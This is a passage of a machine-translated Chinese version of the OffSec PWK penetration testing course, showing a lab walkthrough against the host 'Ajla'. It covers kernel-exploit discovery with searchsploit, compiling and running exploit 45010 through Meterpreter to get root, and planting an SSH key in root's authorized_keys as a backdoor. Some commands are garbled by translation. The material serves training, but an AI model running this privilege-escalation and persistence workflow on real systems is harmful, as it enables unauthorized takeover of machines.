<div style="position:absolute;top:203682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">意味着找到内核漏洞的机会将比旧版本小。</font><font style="vertical-align: inherit;">然而，</font></font></nobr></div>
<div style="position:absolute;top:203701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们不应该完全排除这种可能性。</font></font></nobr></div>
<div style="position:absolute;top:203734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在枚举正在运行的进程、系统服务和已安装的应用程序后，我们发现</font></font></nobr></div>
<div style="position:absolute;top:203753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了 WordPress 安装，Ubuntu 服务器似乎只运行默认服务和</font></font></nobr></div>
<div style="position:absolute;top:203773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序。</font><font style="vertical-align: inherit;">这看起来并不乐观。</font><font style="vertical-align: inherit;">完成申请和服务评估</font></font></nobr></div>
<div style="position:absolute;top:203792;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来确定可能打开的其他端口。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:203827;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:203844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 6792 已创建。</font></font></nobr></div>
<div style="position:absolute;top:203861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 3 已创建。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:203895;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">netstat -tulpn</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:203912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（并非所有进程都可以识别，非拥有的进程信息</font></font></nobr></div>
<div style="position:absolute;top:203929;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不会显示，你必须是 root 才能看到这一切。）</font></font></nobr></div>
<div style="position:absolute;top:203946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活动 Internet 连接（仅限服务器）</font></font></nobr></div>
<div style="position:absolute;top:203963;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Proto Recv-Q Send-Q 本地地址外地址状态PID/程序名称</font></font></nobr></div>
<div style="position:absolute;top:203980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通讯协议    </font></font></nobr></div>
<div style="position:absolute;top:203980;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 0.0.0.0:22 0.0.0.0:*    </font></font></nobr></div>
<div style="position:absolute;top:203980;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 -    </font></font></nobr></div>
<div style="position:absolute;top:203997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp6 0 0 :::80    </font></font></nobr></div>
<div style="position:absolute;top:203997;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:203997;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 -    </font></font></nobr></div>
<div style="position:absolute;top:204013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp6 0 0 :::22    </font></font></nobr></div>
<div style="position:absolute;top:204013;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:::*    </font></font></nobr></div>
<div style="position:absolute;top:204013;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 -    </font></font></nobr></div>
<div style="position:absolute;top:204031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UDP    </font></font></nobr></div>
<div style="position:absolute;top:204031;left:198"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 0 0.0.0.0:67 0.0.0.0:*    </font></font></nobr></div>
<div style="position:absolute;top:204050;left:356"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 920 - 在 Ajla 上运行 netstat</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:204079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是，清单 920 中的输出也没有显示任何有趣的内容。</font><font style="vertical-align: inherit;">此时，它是</font></font></nobr></div>
<div style="position:absolute;top:204099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始研究内核漏洞利用的好主意。</font><font style="vertical-align: inherit;">但首先我们需要找出我们的内核版本</font></font></nobr></div>
<div style="position:absolute;top:204118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标正在运行。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:204153;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uname -a</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:204170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux ajla </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.4.0-21-generic</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64</font></font></nobr></div>
<div style="position:absolute;top:204187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86_64 GNU/Linux </font></font></nobr></div>
<div style="position:absolute;top:204206;left:356"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 921 - 在 Ajla 上运行 uname</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:204236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们有了内核版本，我们将返回到 searchsploit。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:204271;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit ubuntu 16.04</font></font></font></b></nobr></div>
<div style="position:absolute;top:204287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:204304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PA | </font><font style="vertical-align: inherit;">漏洞利用/linux_x86-64/local/</font></font></nobr></div>
<div style="position:absolute;top:204321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter ta | </font><font style="vertical-align: inherit;">漏洞利用/linux_x86-64/local/</font></font></nobr></div>
<div style="position:absolute;top:204338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x8 |exploits/linux/local/47170.c</font></font></nobr></div>
<div style="position:absolute;top:204355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 4.4.x (Ubuntu 16.04) - 'double-fdput()' bp | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/39772.t</font></font></nobr></div>
<div style="position:absolute;top:204372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPL | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/40489.t</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:204511;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="173"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 173 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:204544;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:205621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:205621;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:205621;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">790</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:204640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 4.8 (Ubuntu 16.04) - 泄漏 sctp 内核点 | </font><font style="vertical-align: inherit;">漏洞利用/linux/dos/45919.c</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:204656;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Loca | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/45010.c</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:204673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核 &lt; 4.4.0-116 (Ubuntu 16.04.4) - 本地特权 | </font><font style="vertical-align: inherit;">漏洞利用/linux/local/44298.c</font></font></nobr></div>
<div style="position:absolute;top:204690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:204710;left:320"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 922 - 搜索 ubuntu 16.04 漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:204739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然其中许多看起来可能有效，但其中一个特别吸引了我们的注意力。</font><font style="vertical-align: inherit;">后</font></font></nobr></div>
<div style="position:absolute;top:204759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看漏洞利用 45010, </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">737</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的源代码，</font><font style="vertical-align: inherit;">我们发现它写得很好，已针对</font></font></nobr></div>
<div style="position:absolute;top:204778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几个不同的内核版本，并有很好的编译和执行说明。</font><font style="vertical-align: inherit;">首先，让我们</font></font></nobr></div>
<div style="position:absolute;top:204797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找出Ajla是否有gcc。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:204859;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内核版本并不总是必须完全匹配才能使漏洞利用工作。</font><font style="vertical-align: inherit;">在</font></font></i></nobr></div>
<div style="position:absolute;top:204878;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，该漏洞利用内核 4.13.9 进行了测试，该内核比</font></font></i></nobr></div>
<div style="position:absolute;top:204898;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ajla 上的内核。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:204962;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">海湾合作委员会</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:204979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/sh: 1: gcc: 未找到</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:205013;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find / -name gcc -type f 2&gt;/dev/null</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/bash-completion/completions/gcc</font></font></nobr></div>
<div style="position:absolute;top:205049;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 923 - 尝试在 Ajla 上定位 GCC</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:205079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是，Ajla 没有安装 gcc 二进制文件，所以我们需要在</font></font></nobr></div>
<div style="position:absolute;top:205098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的 Kali 机器，将它转移到 Ajla，希望它仍然可以工作。</font><font style="vertical-align: inherit;">或者，如有必要，我们</font></font></nobr></div>
<div style="position:absolute;top:205118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还可以创建一个与我们的目标系统相对于操作系统相同的虚拟机，</font></font></nobr></div>
<div style="position:absolute;top:205137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内核版本并在其上编译漏洞利用。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:205171;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.4.2</font></font></i></nobr></div>
<div style="position:absolute;top:205171;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限提升</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:205209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将漏洞利用复制到我们的主目录，这样我们就不会改变原始版本。</font><font style="vertical-align: inherit;">一旦</font></font></nobr></div>
<div style="position:absolute;top:205229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">复制完成后，我们将按照文件中的编译说明进行操作。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cp /usr/share/exploitdb/exploits/linux/local/45010.c ./</font></font></font></b></nobr></div>
<div style="position:absolute;top:205280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gcc 45010.c -o 45010</font></font></font></b></nobr></div>
<div style="position:absolute;top:205297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font></nobr></div>
<div style="position:absolute;top:205317;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 924 - 编译漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:205346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞编译没有错误，所以我们将使用meterpreter将其上传到Ajla。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上传 /home/kali/45010 /tmp/</font></font></font></b></nobr></div>
<div style="position:absolute;top:205398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传：/home/kali/45010 -&gt; /tmp/</font></font></nobr></div>
<div style="position:absolute;top:205415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 上传：/home/kali/45010 -&gt; /tmp//45010</font></font></nobr></div>
<div style="position:absolute;top:205434;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 925 - 上传漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:205464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，是时候针对 Ajla 运行漏洞利用程序了。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:205515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 1546 已创建。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:205571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">737 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2020），https://www.exploit-db.com/exploits/45010</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:205699;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="174"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 174 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:205732;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:206809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:206809;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:206809;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">791</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205828;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 5 已创建。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:205861;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /tmp</font></font></b></nobr></div>
<div style="position:absolute;top:205878;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x 45010</font></font></b></nobr></div>
<div style="position:absolute;top:205896;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./45010</font></font></b></nobr></div>
<div style="position:absolute;top:205912;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:205929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根</font></font></nobr></div>
<div style="position:absolute;top:205949;left:367"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 926 - 运行漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:205978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在清单 926 中，漏洞利用没有给我们任何输出，但运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">告诉我们现在</font></font></nobr></div>
<div style="position:absolute;top:205997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以root用户身份运行。</font><font style="vertical-align: inherit;">现在我们有了 root 访问权限，我们可以创建一个更稳定的后门</font></font></nobr></div>
<div style="position:absolute;top:206017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 ssh。</font><font style="vertical-align: inherit;">这将使我们能够回到 Ajla，即使我们的 Meterpreter 会话终止了。</font></font></nobr></div>
<div style="position:absolute;top:206050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们需要在我们的 Kali 机器上生成一个新的 ssh 密钥。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:206112;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果您已经生成了 ssh 密钥，请跳过此步骤。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:206176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh-keygen</font></font></font></b></nobr></div>
<div style="position:absolute;top:206193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成公钥/私钥 rsa 密钥对。</font></font></nobr></div>
<div style="position:absolute;top:206210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入保存密钥的文件（/home/kali/.ssh/id_rsa）： </font></font></nobr></div>
<div style="position:absolute;top:206227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入密码（空表示没有密码）： </font></font></nobr></div>
<div style="position:absolute;top:206244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次输入相同的密码： </font></font></nobr></div>
<div style="position:absolute;top:206261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的身份证明已保存在 /home/kali/.ssh/id_rsa 中。</font></font></nobr></div>
<div style="position:absolute;top:206278;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的公钥已保存在 /home/kali/.ssh/id_rsa.pub 中。</font></font></nobr></div>
<div style="position:absolute;top:206295;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:206329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat:~/.ssh/id_rsa.pub</font></font></font></b></nobr></div>
<div style="position:absolute;top:206346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali</font></font></nobr></div>
<div style="position:absolute;top:206365;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 927 - 在 Kali 上生成 SSH 密钥</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:206394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成 ssh 密钥后，我们可以在 Ajla 上创建 authorized_keys 文件以接受我们的公钥。</font></font></nobr></div>
<div style="position:absolute;top:206414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将通过具有 root shell 的 meterpreter 会话来做到这一点。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:206449;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir /root/.ssh</font></font></b></nobr></div>
<div style="position:absolute;top:206482;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回声“ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD ... kali@kali”&gt; /root/.ssh/authorized_ke</font></font></b></nobr></div>
<div style="position:absolute;top:206500;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:206519;left:253"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 928 - 将公钥添加到 /root/.ssh/authorized_keys 文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:206549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在在 Kali 上，我们可以使用 ssh 客户端直接连接到 Ajla。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:206583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh root@sandbox.local</font></font></font></b></nobr></div>
<div style="position:absolute;top:206600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">欢迎使用 Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)</font></font></nobr></div>
<div style="position:absolute;top:206617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:206651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根@ajla:~# </font></font></nobr></div>
<div style="position:absolute;top:206670;left:352"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 929 - 使用 ssh 登录 Ajla </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:206887;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="175"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 175 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:206920;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:207997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:207997;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:207997;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">792</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:207016;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.4.3</font></font></i></nobr></div>
<div style="position:absolute;top:207016;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索数据库凭据</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:207054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在寻找凭据时，我们必须像管理员或开发人员一样思考。</font><font style="vertical-align: inherit;">你会在哪里</font></font></nobr></div>
<div style="position:absolute;top:207073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储凭据？</font><font style="vertical-align: inherit;">如何使用凭据？</font><font style="vertical-align: inherit;">是否有任何历史记录或日志文件</font></font></nobr></div>
<div style="position:absolute;top:207092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭据可能会意外保存？</font></font></nobr></div>
<div style="position:absolute;top:207125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个例子是如果服务器的用户不小心在用户名字段中输入了他们的密码，</font></font></nobr></div>
